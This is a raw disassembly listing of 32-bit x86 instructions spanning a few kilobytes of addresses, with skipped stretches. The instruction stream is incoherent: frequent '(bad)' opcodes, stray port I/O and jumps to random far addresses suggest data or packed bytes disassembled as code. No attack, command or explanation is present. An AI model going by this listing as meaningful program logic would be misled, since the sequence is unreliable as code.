  40470c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40470d:	push   ss
  40470e:	loope  0x4046b4
  404710:	shr    BYTE PTR [esi-0x6f],cl
  404713:	mov    al,0x61
  404715:	mov    ds:0x3e64789e,al
  40471a:	ss mov ebx,0x4ee8f365
  404720:	sbb    al,0xaf
  404722:	push   0xffffffbf
  404724:	pop    ds
  404725:	ss ror al,cl
  404728:	and    al,0x20
  40472a:	in     eax,0x3
  40472c:	fwait
  40472d:	push   eax
  40472e:	push   0x26
  404730:	mov    bh,0x2
  404732:	fnstsw WORD PTR [ebx]
  404734:	xor    cl,BYTE PTR [eax+0x5d]
  404737:	push   ebx
  404738:	clc    
  404739:	pop    ss
  40473a:	in     eax,0x9b
	...
  404750:	add    bl,bh
  404752:	push   edx
  404753:	jmp    0xc203695b
  404758:	repz loope 0x404772
  40475b:	in     eax,dx
  40475c:	fwait
  40475d:	and    edi,DWORD PTR [ecx+0x481ea436]
  404763:	xor    DWORD PTR [edx+edx*2+0x1066119e],esp
  40476a:	add    ebp,ecx
  40476c:	clc    
  40476d:	clc    
  40476e:	push   ss
  40476f:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404771:	cmp    dh,dl
  404773:	or     eax,0x632af2e
  404778:	cs scas eax,DWORD PTR es:[edi]
  40477a:	stos   BYTE PTR es:[edi],al
  40477b:	jmp    0x5c62:0xa198a5
  404782:	mov    eax,ds:0x682ded75
  404787:	scas   eax,DWORD PTR es:[edi]
  404788:	jmp    0xedb5e931
  40478d:	dec    esp
  40478e:	cmp    bl,al
  404790:	(bad)  
  404791:	inc    esp
  404792:	(bad)  
  404793:	ret    
  404794:	xor    bl,BYTE PTR [edx-0x3c]
  404797:	or     al,0xe9
  404799:	lahf   
  40479a:	(bad)  
  40479b:	in     al,dx
  40479c:	push   0xb6fe126f
  4047a1:	add    al,0x8f
  4047a3:	test   DWORD PTR [ebx],edi
  4047a5:	add    eax,0x9339ffa1
  4047aa:	add    eax,DWORD PTR [ecx]
  4047ac:	jmp    0x58a3f255
  4047b1:	stos   DWORD PTR es:[edi],eax
  4047b2:	add    cl,cl
  4047b4:	stos   BYTE PTR es:[edi],al
	...
  4047c9:	add    BYTE PTR [esi-0x73],ch
  4047cc:	in     al,dx
  4047cd:	push   0xffffffc6
  4047cf:	or     al,BYTE PTR [eax]
  4047d1:	cmc    
  4047d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047d3:	test   DWORD PTR [ebp-0x27],edi
  4047d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047d7:	push   ss
  4047d8:	sbb    DWORD PTR [esi-0x52],ebp
  4047db:	idiv   dh
  4047dd:	fsubr  QWORD PTR [edx+ebp*4-0x5ebbbc26]
  4047e4:	(bad)  
  4047e5:	fdivr  st(4),st
  4047e7:	lahf   
  4047e8:	jne    0x4047c7
  4047ea:	inc    ebp
  4047eb:	pop    ss
  4047ec:	or     BYTE PTR [ecx-0x57],dl
  4047ef:	mov    ebp,0xc3ea3eff
  4047f4:	adc    cl,ch
  4047f6:	(bad)  
  4047f7:	(bad)  
  4047f8:	in     al,dx
  4047f9:	push   0xffffff86
  4047fb:	or     al,BYTE PTR [eax]
  4047fd:	popf   
  4047fe:	rol    BYTE PTR [ebx+0x16a4ed7d],0x16
  404805:	push   ss
  404806:	mov    ?,edx
  404808:	(bad)  
  404809:	xchg   esp,eax
  40480a:	pushf  
  40480b:	stos   BYTE PTR es:[edi],al
  40480c:	scas   al,BYTE PTR es:[edi]
  40480d:	add    ah,al
  40480f:	arpl   di,di
  404811:	call   DWORD PTR [ebx]
  404813:	adc    bh,bh
  404815:	jne    0x40479d
  404817:	ins    BYTE PTR es:[edi],dx
  404818:	add    eax,0xc96579db
  40481d:	ret    0x47a
  404820:	push   ebp
  404821:	mov    ebp,DWORD PTR [edx-0x77]
  404824:	(bad)  
  404825:	lock pop ecx
  404827:	sti    
  404828:	or     ebp,eax
  40482a:	mov    ecx,0xffff67
	...
  404843:	xlat   BYTE PTR ds:[ebx]
  404844:	dec    edx
  404845:	or     al,0x83
  404847:	fwait
  404848:	repnz push DWORD PTR [ebx-0x50]
  40484c:	arpl   WORD PTR [ebp+0xc],si
  40484f:	shl    dx,1
  404852:	dec    DWORD PTR [ecx]
  404854:	adc    eax,eax
  404856:	je     0x4047e4
  404858:	jno    0x40489f
  40485a:	lock outs dx,BYTE PTR ds:[esi]
  40485c:	arpl   WORD PTR [ebp+0xc],si
  40485f:	es xchg bl,ah
  404862:	jmp    FWORD PTR [ecx]
  404864:	adc    eax,eax
  404866:	je     0x4048c4
  404868:	xchg   DWORD PTR [ebp-0x4],edi
  40486b:	inc    BYTE PTR [ebx]
  40486d:	adc    BYTE PTR [eax],al
  40486f:	or     eax,0x8a75fea4
  404874:	fs jne 0x40486f
  404877:	push   esi
  404878:	call   0x75c0:0x1059ffe6
  40487f:	out    dx,eax
  404880:	fs jne 0x404893
  404883:	imul   edi,edx,0x7c13fffb
  404889:	push   DWORD PTR [ebp-0x3a]
  40488c:	imul   ecx,DWORD PTR [edi-0x1],0x79
  404890:	lea    eax,fs:[ebp-0x62]
  404894:	shl    edi,cl
  404896:	loopne 0x404845
  404898:	fs (bad) 
  40489a:	jmp    DWORD PTR [edi-0x117f082]
  4048a0:	out    dx,al
  4048a1:	mov    eax,ds:0xeeb6eff
	...
  4048ba:	add    BYTE PTR [eax],al
  4048bc:	repnz adc al,0xaf
  4048bf:	sub    DWORD PTR [ebx-0x67],0xffffffa1
  4048c3:	jne    0x404860
  4048c5:	add    DWORD PTR [ecx-0x74577f1e],esi
  4048cb:	inc    ebp
  4048cc:	stos   DWORD PTR es:[edi],eax
  4048cd:	sub    al,0x1f
  4048cf:	or     al,0xa7
  4048d1:	cmp    eax,0xbdf2ff49
  4048d6:	stos   DWORD PTR es:[edi],eax
  4048d7:	pop    edx
  4048d8:	inc    ebp
  4048d9:	enter  0xba1,0x67
  4048dd:	aad    0xd4
  4048df:	mov    edx,gs
  4048e1:	pop    ecx
  4048e2:	xor    al,0xff
  4048e4:	sar    BYTE PTR [ebp+0x684411ab],cl
  4048ea:	mov    eax,ds:0xe4f5670b
  4048ef:	xor    BYTE PTR [edx-0x68fffb8b],0xa9
  4048f6:	adc    al,0x11
  4048f8:	and    BYTE PTR [esi+0x1d92fef3],bl
  4048fe:	mov    eax,ds:0x17180f75
  404903:	or     bh,bh
  404905:	sbb    eax,0x1600ffa2
  40490a:	inc    edi
  40490b:	lock push edi
  40490d:	xor    DWORD PTR [edx],esp
  40490f:	jecxz  0x404901
  404911:	aaa    
  404912:	mov    eax,ds:0x49419b75
  404917:	fucom  st(0)
  404919:	inc    edi
  40491a:	retf   
  40491b:	ret    0xa9ab
  40491e:	mov    eax,DWORD PTR ss:[eax]
	...
  404935:	ret    
  404936:	sub    ecx,eax
  404938:	lock je 0x40493f
  40493b:	mov    ebp,0xf1023aff
  404940:	stos   DWORD PTR es:[edi],eax
  404941:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404943:	push   ds
  404944:	mov    eax,ds:0x84e1451e
  404949:	sub    cl,BYTE PTR [edx]
  40494b:	jmp    0x7cde3267
  404950:	or     ecx,DWORD PTR [edi-0x6f5ef768]
  404956:	or     ch,BYTE PTR [ecx]
  404958:	sbb    ch,dl
  40495a:	(bad)  
  40495b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40495c:	xchg   ebx,eax
  40495d:	xlat   BYTE PTR ds:[ebx]
  40495e:	popf   
  40495f:	pop    esp
  404960:	or     al,0x8f
  404962:	outs   dx,DWORD PTR ds:[esi]
  404963:	retf   
  404964:	mov    al,ds:0x17a90a70
  404969:	lds    eax,FWORD PTR [ebx+0x2a7a04c]
  40496f:	fld    DWORD PTR [ebx]
  404971:	aam    0xf2
  404973:	mov    ebp,0x3c9e5316
  404978:	pushf  
  404979:	aas    
  40497a:	faddp  st(6),st
  40497c:	mov    al,ds:0x17a90a40
  404981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404982:	inc    ecx
  404983:	ins    BYTE PTR es:[edi],dx
  404984:	inc    esi
  404985:	aaa    
  404986:	xor    eax,DWORD PTR [ecx-0x7161ba03]
  40498c:	mov    al,ds:0xa4910a9a
  404991:	sti    
  404992:	popf   
  404993:	jle    0x404921
  404995:	in     al,0x39
  404997:	mov    al,ds:0xc5
	...
  4049ac:	add    BYTE PTR [eax],al
  4049ae:	mov    ds:0x138d1402,eax
  4049b3:	test   BYTE PTR ds:0x5e9df957,ch
  4049b9:	enter  0x5b2a,0x57
  4049bd:	mov    al,ds:0x3e902e8
  4049c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c3:	mov    DWORD PTR [edi+ecx*1+0x6b5c2ac],ebp
  4049ca:	daa    
  4049cb:	(bad)  
  4049cd:	call   0xb2295183
  4049d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049d3:	add    al,BYTE PTR [eax]
  4049d5:	es xchg ecx,eax
  4049d7:	push   cs
  4049d8:	call   0xffde4925
  4049dd:	loop   0x4049c3
  4049df:	pop    ss
  4049e0:	jno    0xe9813840
  4049e6:	inc    edi
  4049e7:	pop    ss
  4049e8:	or     al,0x11
  4049ea:	xchg   BYTE PTR [ebp+0xf3cf6ff],bh
  4049f0:	push   0x429016
  4049f5:	out    0x9e,al
  4049f7:	push   cs
  4049f8:	call   0xffdd950b
  4049fd:	pusha  
  4049fe:	push   ds
  4049ff:	pop    edx
  404a00:	dec    dh
  404a02:	inc    eax
  404a03:	sub    bh,BYTE PTR [esi]
  404a05:	call   0x64cd4cae
  404a0a:	gs pushf 
  404a0c:	push   DWORD PTR [esi-0x7258556d]
	...
  404a26:	add    BYTE PTR [eax],ah
  404a28:	popf   
  404a29:	lea    ebp,[ebp+eiz*2-0x64]
  404a2d:	call   FWORD PTR [esi+0x51b59d7b]
  404a33:	or     DWORD PTR [ebp+0x6f4481ff],ebx
  404a39:	add    cl,ch
  404a3b:	sub    eax,DWORD PTR [edi-0x62cf8044]
  404a41:	inc    eax
  404a42:	out    0x20,al
  404a44:	clc    
  404a45:	add    cl,ch
  404a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a48:	(bad)  
  404a49:	xchg   ebp,eax
  404a4a:	sub    ebx,DWORD PTR [ecx]
  404a4c:	popf   
  404a4d:	call   DWORD PTR [esi-0x5b]
  404a50:	repnz (bad) 
  404a52:	call   0x6ac457fb
  404a57:	stos   DWORD PTR es:[edi],eax
  404a58:	add    al,BYTE PTR [eax]
  404a5a:	add    BYTE PTR [ebx+0x40],dl
  404a5d:	sub    al,0x50
  404a5f:	div    BYTE PTR [ecx+0x68be412c]
  404a65:	mov    esp,0xb00cead
  404a6a:	rcr    BYTE PTR [ebx],0xa
  404a6d:	jmp    0x41093e
  404a72:	lea    ebp,[ebx]
  404a74:	sar    dh,0xff
  404a77:	mov    cl,0x71
  404a79:	inc    edx
  404a7a:	sub    al,0x3e
  404a7c:	call   0x7f774f
  404a81:	call   0x472e25
  404a86:	or     ecx,esi
  404a88:	stc    
  404a89:	add    al,0xe9
	...
  404a9f:	add    BYTE PTR [ecx],dl
  404aa1:	add    BYTE PTR [eax],al
  404aa3:	add    BYTE PTR [ecx-0x5],dl
  404aa6:	or     ebp,eax
  404aa8:	push   ebx
  404aa9:	data16 (bad) 
  404aab:	inc    DWORD PTR [ebp-0x40]
  404aae:	jne    0x404abf
  404ab0:	mul    BYTE PTR [ebp+0x28]
  404ab3:	inc    ecx
  404ab4:	ds jge 0x404b2c
  404ab7:	or     al,0x66
  404ab9:	sbb    bl,bh
  404abb:	call   DWORD PTR [ecx]
  404abd:	imul   ecx,DWORD PTR [edx],0x757d4e6a
  404ac3:	or     al,0x16
  404ac5:	mov    ds,edi
  404ac7:	call   DWORD PTR [ecx]
  404ac9:	jae    0x404a60
  404acb:	ret    0x7d30
  404ace:	dec    DWORD PTR [ebp+0x505192bc]
  404ad4:	ss push edx
  404ad6:	(bad)  
  404ad8:	xchg   ecx,eax
  404ad9:	iret   
  404ada:	(bad)  
  404adb:	jne    0x404ab3
  404add:	jl     0x404b54
  404adf:	adc    al,0x81
  404ae1:	cli    
  404ae2:	(bad)  
  404ae4:	push   ecx
  404ae5:	cli    
  404ae6:	pop    es
  404ae7:	call   0xffdd8493
  404aec:	loopne 0x404b2f
  404aee:	(bad)  
  404aef:	fcmovnu st,st(0)
  404af1:	inc    esp
  404af2:	stos   BYTE PTR es:[edi],al
  404af3:	pusha  
  404af4:	and    ch,BYTE PTR [eax-0x11]
  404af7:	mov    BYTE PTR [edx],ah
  404af9:	push   ds
  404afa:	popf   
  404afb:	inc    eax
  404afd:	sub    BYTE PTR [eax],ah
  404aff:	adc    BYTE PTR [edi+0xeb017e],ah
	...
  404b19:	xchg   ebp,eax
  404b1a:	cld    
  404b1b:	pop    ss
  404b1c:	adc    BYTE PTR [eax-0x5f01a8c2],ch
  404b22:	or     al,0xab
  404b24:	inc    edx
  404b25:	dec    ecx
  404b26:	test   eax,0x15670b03
  404b2b:	loopne 0x404b94
  404b2d:	xchg   cl,al
  404b2f:	inc    esp
  404b30:	add    BYTE PTR [eax-0x4c17f0ea],al
  404b36:	les    ebx,FWORD PTR [ebp+0x587670ff]
  404b3c:	(bad)  
  404b3d:	push   0xe3e834b4
  404b42:	ins    BYTE PTR es:[edi],dx
  404b43:	popf   
  404b44:	push   edi
  404b46:	sub    BYTE PTR [edi],bl
  404b48:	sbb    BYTE PTR [edi-0x2d00f02b],ah
  404b4e:	mov    ebp,0xa1baff33
  404b53:	pushf  
  404b54:	push   ebp
  404b55:	lahf   
  404b56:	jo     0x404b68
  404b58:	(bad)  
  404b59:	mov    edx,0xb2ff3395
  404b5e:	mov    eax,ds:0x8c2254ab
  404b63:	popf   
  404b64:	call   0xffddabeb
  404b69:	and    ah,BYTE PTR [esi]
  404b6b:	ret    0x8fe
  404b6e:	adc    al,0x34
  404b70:	(bad)  
  404b71:	cmp    ch,ch
  404b73:	popf   
  404b74:	(bad)  
  404b75:	clc    
  404b76:	add    DWORD PTR [ecx-0x47],edx
  404b79:	inc    ebx
  404b7a:	add    ch,cl
  404b7c:	xchg   BYTE PTR [eax],al
	...
  404b92:	out    0xa,eax
  404b94:	ins    BYTE PTR es:[edi],dx
  404b95:	xchg   ebx,eax
  404b96:	loope  0x404b32
  404b98:	dec    esi
  404b99:	popf   
  404b9a:	adc    bl,BYTE PTR [esi+0x47]
  404b9d:	popf   
  404b9e:	shr    BYTE PTR [ecx+0x2a7702f],1
  404ba4:	ss push edi
  404ba6:	call   FWORD PTR [ebx-0x2b3062d2]
  404bac:	inc    ecx
  404bad:	popf   
  404bae:	mov    al,0xc8
  404bb0:	sub    edi,eax
  404bb2:	test   al,0x35
  404bb4:	bound  esi,QWORD PTR [eax+0x170e030d]
  404bba:	mov    bl,0x99
  404bbc:	jl     0x404bb1
  404bbe:	xchg   ecx,eax
  404bbf:	adc    ch,ch
  404bc1:	pushf  
  404bc2:	adc    cl,BYTE PTR [ebx]
  404bc4:	add    ebp,ebx
  404bc6:	sbb    BYTE PTR [edx-0xc9a3512],0xe8
  404bcd:	ss sbb al,0xa7
  404bd0:	ficom  WORD PTR [esi]
  404bd2:	fwait
  404bd3:	stos   BYTE PTR es:[edi],al
  404bd4:	xor    bh,BYTE PTR [ebp-0x3c1d65a0]
  404bda:	sar    eax,cl
  404bdc:	lds    edx,FWORD PTR [esi]
  404bde:	mov    bh,0x32
  404be0:	rcl    DWORD PTR [ecx+0x33b69a69],1
  404be6:	inc    eax
  404be7:	adc    cl,dl
  404be9:	pushf  
  404bea:	mov    dl,0xee
  404bec:	cmp    BYTE PTR [ebp+0x5d910aba],bl
  404bf2:	sub    BYTE PTR [edx+0xab96],bl
	...
  404c08:	add    BYTE PTR [eax],al
  404c0a:	add    BYTE PTR ds:0xee9c8ebd,cl
  404c10:	(bad)  
  404c11:	fld    QWORD PTR [ebx]
  404c13:	jp     0x404ba2
  404c15:	lea    ebx,[edx+edx*4-0x668a0012]
  404c1c:	repnz (bad) 
  404c1e:	hlt    
  404c1f:	test   al,0x2c
  404c21:	sbb    ah,BYTE PTR [esi-0x67]
  404c24:	or     ch,al
  404c26:	mov    al,ds:0x56ff9a0b
  404c2b:	mov    ecx,0xd4d4feee
  404c30:	cwde   
  404c31:	jne    0x404c28
  404c33:	jle    0x404c1a
  404c35:	(bad)  
  404c36:	mov    ah,0x9c
  404c38:	stos   BYTE PTR es:[edi],al
  404c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c3a:	and    ebx,DWORD PTR ss:[edx-0x674f4b01]
  404c41:	jne    0x404c3c
  404c43:	adc    edx,DWORD PTR [eax]
  404c45:	or     al,0x93
  404c47:	test   al,0x98
  404c49:	jne    0x404c2c
  404c4b:	dec    esp
  404c4c:	jne    0x404c4d
  404c4e:	push   cs
  404c4f:	cmp    ecx,ebx
  404c51:	ret    0xa4d9
  404c54:	das    
  404c55:	mov    ecx,DWORD PTR ds:0x9af0be27
  404c5b:	mov    edx,0x2f122b31
  404c60:	aas    
  404c61:	or     al,0xe6
  404c63:	pop    ebx
  404c64:	mov    BYTE PTR [ebp-0x1f],al
  404c67:	or     al,0xf
  404c69:	or     BYTE PTR [esi-0x1a],ah
  404c6c:	xchg   esi,eax
  404c6d:	(bad)  
  404c6e:	and    al,0x0
	...
  404c84:	aaa    
  404c85:	add    al,BYTE PTR [eax]
  404c87:	jmp    0x1b7dd230
  404c8c:	cmp    al,BYTE PTR [edx+0x0]
  404c8f:	jmp    0x2cc38344
  404c94:	stos   DWORD PTR es:[edi],eax
  404c95:	add    dh,BYTE PTR [edi+edi*1+0x1e]
  404c99:	aas    
  404c9a:	lock cmp DWORD PTR [ecx+0x3],edi
  404c9e:	push   0xffffffe9
  404ca0:	rol    BYTE PTR [edx],cl
  404ca2:	or     DWORD PTR [ebx+edx*1],0xffffff99
  404ca6:	jae    0x404ca8
  404ca8:	add    edi,DWORD PTR [ebp+esi*2+0x10]
  404cac:	xor    eax,0xa4006a00
  404cb1:	dec    BYTE PTR [ebp+eax*2+0x15fece76]
  404cb8:	sub    al,0xa6
  404cba:	inc    eax
  404cbb:	add    ch,dh
  404cbd:	les    esi,FWORD PTR [edi+ebp*1+0x4d]
  404cc1:	sti    
  404cc2:	repz add dl,dh
  404cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cc6:	mov    al,BYTE PTR [ebp-0x26]
  404cc9:	xchg   DWORD PTR [ebp-0x10],ecx
  404ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ccd:	push   es
  404cce:	ja     0x404ce7
  404cd0:	or     eax,0x72758b71
  404cd5:	mov    DWORD PTR [ebp+0x8],edi
  404cd8:	xor    eax,0xbce3f04b
  404cdd:	outs   dx,DWORD PTR ds:[esi]
  404cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cdf:	mov    edx,DWORD PTR [ebx+0x0]
  404ce2:	push   DWORD PTR [ebp-0x42]
  404ce5:	mov    eax,DWORD PTR [eax]
  404ce7:	inc    DWORD PTR [eax]
	...
  404cfd:	adc    ecx,DWORD PTR [eax-0x10ac818]
  404d03:	dec    DWORD PTR [edx+0x5b5ddbcd]
  404d09:	mov    eax,0x87b3000c
  404d0f:	in     al,dx
  404d10:	add    DWORD PTR [edx+0x70],0x53
  404d14:	push   esi
  404d15:	mov    eax,ds:0x8f2f71e6
  404d1a:	(bad)  
  404d1b:	out    0x99,eax
  404d1d:	xor    eax,0x68b0004
  404d22:	lds    eax,FWORD PTR [ebp-0x4]
  404d25:	dec    esi
  404d26:	add    al,0x0
  404d28:	add    BYTE PTR [ebp-0x3c],al
  404d2b:	je     0x404d6b
  404d2d:	xchg   esi,eax
  404d2e:	fsubr  QWORD PTR [esi]
  404d30:	inc    ecx
  404d31:	ds shl edi,1
  404d34:	inc    ebp
  404d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d36:	inc    esp
  404d37:	add    eax,DWORD PTR [eax]
  404d39:	lods   al,BYTE PTR ds:[esi]
  404d3a:	imul   ecx,DWORD PTR [edi],0x2b1a1c2f
  404d40:	jg     0x404cfa
  404d42:	jmp    0x6e:0x560f5303
  404d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d4b:	ret    
  404d4c:	je     0x404cdf
  404d4e:	adc    al,0x9b
  404d50:	lea    esp,[edx+0x35]
  404d53:	xor    ebp,eax
  404d55:	mov    ds:0x77000384,al
  404d5a:	dec    eax
  404d5b:	mov    dl,0x83
  404d5d:	push   edx
  404d5e:	cmp    eax,0x7403
	...
  404d73:	add    BYTE PTR [eax],al
  404d75:	add    BYTE PTR [ebp-0x58fffb7f],bl
  404d7b:	test   eax,0xe25c5e3a
  404d80:	lds    edi,FWORD PTR [eax+0x3a9a7]
  404d86:	dec    eax
  404d87:	push   edi
  404d88:	ds leave 
  404d8a:	fs push esi
  404d8c:	mov    gs,esp
  404d8e:	and    al,0xdd
  404d90:	xchg   edx,eax
  404d91:	adc    edx,0xfffffffb
  404d94:	call   0xfe9f4d9
  404d99:	adc    ah,BYTE PTR [esi+ecx*2]
  404d9c:	mov    cl,0x2e
  404d9e:	out    0xa9,al
  404da0:	add    esi,DWORD PTR [esi+ebx*4+0x2c]
  404da4:	xlat   BYTE PTR ds:[ebx]
  404da5:	fnstcw WORD PTR [ecx-0x25fffc16]
  404dab:	test   al,0x5b
  404dad:	add    DWORD PTR [edi+0x64c903a9],esp
  404db3:	push   cs
  404db4:	aas    
  404db5:	cli    
  404db6:	popa   
  404db7:	test   eax,0xaae7c603
  404dbc:	add    eax,esi
  404dbe:	out    0xab,eax
  404dc0:	add    eax,esi
  404dc2:	out    0x2,eax
  404dc4:	jmp    0xe903:0xe5426103
  404dcb:	inc    ecx
  404dcc:	in     al,dx
  404dcd:	(bad)  
  404dce:	sub    edi,DWORD PTR ds:0x27d3495
  404dd4:	adc    eax,DWORD PTR [edi*2+0x41302]
	...
  404def:	lea    eax,[edx]
  404df1:	add    eax,DWORD PTR [edi+ecx*4]
  404df4:	loop   0x404de0
  404df6:	add    esp,DWORD PTR [edi-0x5ad1f6d4]
  404dfc:	test   DWORD PTR [ebp+ebx*4-0x4a036889],esp
  404e03:	mov    DWORD PTR [ecx-0x17],eax
  404e06:	or     al,0xe7
  404e08:	or     al,0xeb
  404e0a:	retf   0xbee4
  404e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0e:	xchg   ebx,eax
  404e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e10:	add    ch,cl
  404e12:	add    ebp,DWORD PTR [edx]
  404e14:	cmp    eax,0xcb03439
  404e19:	sbb    eax,0xf497a72e
  404e1e:	mov    cl,0xd1
  404e20:	inc    ebx
  404e21:	jmp    0xe650b532
  404e26:	shr    dl,0x92
  404e29:	jmp    0xfe42f531
  404e2e:	push   cs
  404e2f:	jnp    0x404dc7
  404e31:	fdivr  QWORD PTR [ebp-0x7316bc37]
  404e37:	jmp    0xcd89:0xd2c4b092
  404e3e:	test   BYTE PTR [ebx-0x75],ch
  404e41:	fs ds das 
  404e44:	xor    eax,DWORD PTR [ecx-0x1e]
  404e47:	add    DWORD PTR [ebx-0x17],0xbe9ce6ab
  404e4e:	cwde   
  404e4f:	xlat   BYTE PTR ds:[ebx]
  404e50:	or     DWORD PTR [eax],eax
  404e52:	test   eax,0x0
	...
  404e67:	add    BYTE PTR [eax+0x232c82fc],ch
  404e6d:	out    dx,eax
  404e6e:	jbe    0x404e82
  404e70:	and    BYTE PTR [eax-0x10],al
  404e73:	cmp    DWORD PTR [ebx-0xb],edx
  404e76:	stos   BYTE PTR es:[edi],al
  404e77:	jmp    0x1200ce20
  404e7c:	int    0x5
  404e7e:	mov    dh,0x2c
  404e80:	xor    ecx,DWORD PTR cs:[edi]
  404e83:	aaa    
  404e84:	rcl    DWORD PTR [eax+edx*2-0x2c0a91a],0x19
  404e8c:	sahf   
  404e8d:	dec    esp
  404e8e:	inc    ebp
  404e8f:	gs mov ah,0x5
  404e92:	mov    dh,0xa4
  404e94:	inc    ebx
  404e95:	xor    ecx,DWORD PTR [edi]
  404e97:	lahf   
  404e98:	cdq    
  404e99:	cwde   
  404e9a:	push   eax
  404e9b:	fidiv  WORD PTR [esi+0x3f]
  404e9e:	stc    
  404e9f:	cdq    
  404ea0:	lahf   
  404ea1:	dec    esp
  404ea2:	inc    ebp
  404ea3:	inc    ecx
  404ea4:	je     0x404eab
  404ea6:	mov    bh,0xac
  404ea8:	push   ss
  404ea9:	xor    ecx,DWORD PTR [edi]
  404eab:	jbe    0x404f1e
  404ead:	mov    ss,WORD PTR [eax+0x26]
  404eb0:	cdq    
  404eb1:	xchg   edx,eax
  404eb2:	push   0x428fd2
  404eb7:	fld    DWORD PTR fs:[esi+0x683f0150]
  404ebe:	add    cl,ch
  404ec0:	and    edi,DWORD PTR [esi-0x793e93cc]
  404ec6:	push   eax
  404ec7:	add    edi,edi
  404ec9:	imul   eax,DWORD PTR [eax],0xffffffe9
	...
  404ee0:	add    BYTE PTR [edi+eax*4+0x2ab37545],dh
  404ee7:	es push cs
  404ee9:	jmp    0xff95:0x798e802
  404ef0:	rcl    eax,0xba
  404ef3:	inc    DWORD PTR [eax]
  404ef5:	popa   
  404ef6:	mov    ebx,0x816ab555
  404efc:	les    esp,FWORD PTR [edx-0x72000093]
  404f02:	in     eax,0x69
  404f04:	add    BYTE PTR [esi+edi*8+0x691675fe],dl
  404f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f0c:	aad    0x31
  404f0e:	ins    DWORD PTR es:[edi],dx
  404f0f:	mov    DWORD PTR [ebp+0x22],eax
  404f12:	out    0x0,al
  404f14:	add    BYTE PTR [ecx],dh
  404f16:	sub    al,0xff
  404f18:	jne    0x404f10
  404f1a:	push   0x6d71d4e7
  404f1f:	push   0xfe9c
  404f24:	lea    edi,[ebx-0x22]
  404f27:	(bad)  
  404f28:	inc    DWORD PTR [ecx-0x69841832]
  404f2e:	ins    DWORD PTR es:[edi],dx
  404f2f:	inc    edi
  404f31:	dec    ebx
  404f32:	fdivp  st(6),st
  404f34:	jmp    DWORD PTR [ecx+0x1a]
  404f37:	add    BYTE PTR [eax],al
  404f39:	into   
  404f3a:	mov    DWORD PTR [ebp-0x928ea0],eax
  404f40:	push   eax
  404f41:	dec    di
  404f43:	test   eax,0x0
	...
  404f58:	add    BYTE PTR [eax],al
  404f5a:	mov    esi,0xdc2bc8a7
  404f5f:	mov    DWORD PTR [ebp-0x944e8c],edi
  404f65:	jmp    0x404ef4
  404f67:	cmp    BYTE PTR [edi],0x0
  404f6a:	or     eax,DWORD PTR [ebx]
  404f6c:	mov    edx,0x8e01
  404f71:	or     ebx,DWORD PTR [edx+esi*8+0x89c602]
  404f78:	inc    edi
  404f79:	inc    ecx
  404f7a:	push   DWORD PTR [esi-0x80]
  404f7d:	add    BYTE PTR [esi+0x0],cl
  404f80:	jb     0x404f67
  404f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f83:	mov    al,ds:0x41b974c3
  404f88:	js     0x404f8a
  404f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f8b:	test   eax,0x54c78588
  404f90:	xchg   esi,eax
  404f91:	call   edi
  404f93:	dec    esp
  404f94:	adc    BYTE PTR [eax],cl
  404f96:	aas    
  404f97:	or     eax,0x7128ffaf
  404f9c:	pop    es
  404f9d:	push   0xffffffa7
  404f9f:	out    dx,eax
  404fa0:	add    edi,edi
  404fa2:	xchg   edx,eax
  404fa3:	mov    eax,ds:0x84fba9ab
  404fa8:	xchg   esi,eax
  404fa9:	call   0xffd6ce88
  404fae:	push   edi
  404faf:	adc    al,0x10
  404fb1:	or     BYTE PTR [edi],cl
  404fb3:	pop    es
  404fb4:	mov    al,0xff
  404fb6:	lock add DWORD PTR [esp+eax*1],eax
  404fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fbb:	test   eax,0xe9ab
	...
  404fd0:	add    BYTE PTR [eax],al
  404fd2:	add    al,bh
  404fd4:	xor    al,0x96
  404fd6:	mov    DWORD PTR [edx],esp
  404fd8:	dec    esi
  404fd9:	xchg   esi,eax
  404fda:	call   eax
  404fdc:	rcl    DWORD PTR [esi-0x695658fd],0xb5
  404fe3:	arpl   sp,dx
  404fe5:	xchg   ebp,eax
  404fe6:	dec    DWORD PTR [edi-0x59]
  404fe9:	repz push DWORD PTR [eax-0x58fbfc3f]
  404ff0:	test   eax,0xa94e52ab
  404ff5:	add    edx,DWORD PTR [eax-0x68]
  404ff8:	ss aaa 
  404ffa:	call   DWORD PTR [eax-0x608a69fc]
  405000:	icebp  
  405001:	and    ah,dl
  405003:	adc    BYTE PTR [edx+ebp*1+0x3a9a4ff],0xff
  40500b:	cmp    al,BYTE PTR [ebp+0x268ff96]
  405011:	push   ecx
  405012:	add    esi,DWORD PTR [edi-0x58d416fe]
  405018:	(bad)  
  405019:	call   0x80298f21
  40501e:	add    al,0xa7
  405020:	xor    al,dh
  405022:	dec    edi
  405023:	jecxz  0x404fb8
  405025:	mov    esi,0xe10d3895
  40502a:	stos   DWORD PTR es:[edi],eax
  40502b:	outs   dx,BYTE PTR ds:[esi]
  40502c:	scas   al,BYTE PTR es:[edi]
  40502d:	scas   al,BYTE PTR es:[edi]
  40502e:	xchg   ebp,eax
  40502f:	aas    
  405030:	mov    ebp,0x322095a4
